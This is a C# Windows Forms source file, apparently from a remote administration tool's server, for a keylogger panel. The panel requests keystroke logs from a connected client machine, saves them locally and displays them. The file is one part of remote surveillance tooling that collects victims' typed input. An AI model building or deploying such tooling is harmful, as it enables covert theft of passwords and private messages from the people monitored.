using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly string _path;

        public FrmKeylogger(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmKl = this;
            _path = Path.Combine(_connectClient.Value.DownloadDirectory, "Logs\\");
            InitializeComponent();
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);

                if (!Directory.Exists(_path))
                {
                    Directory.CreateDirectory(_path);
                    return;
                }

                DirectoryInfo dicInfo = new DirectoryInfo(_path);

                FileInfo[] iFiles = dicInfo.GetFiles();

                foreach (FileInfo file in iFiles)
                {
                    lstLogs.Items.Add(new ListViewItem() { Text = file.Name });
                }
            }
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;
            lstLogs.Items.Clear();

            new Core.Packets.ServerPackets.GetKeyloggerLogs().Execute(_connectClient);
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                wLogViewer.Navigate(Path.Combine(_path, lstLogs.SelectedItems[0].Text));
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmKl = null;
        }

        public void AddLogToListview(string logName)
        {
            try
            {
                lstLogs.Invoke((MethodInvoker) delegate
                {
                    lstLogs.Items.Add(new ListViewItem {Text = logName});
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void SetGetLogsEnabled(bool enabled)
        {
            try
            {
                btnGetLogs.Invoke((MethodInvoker) delegate
                {
                    btnGetLogs.Enabled = enabled;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
    }
}
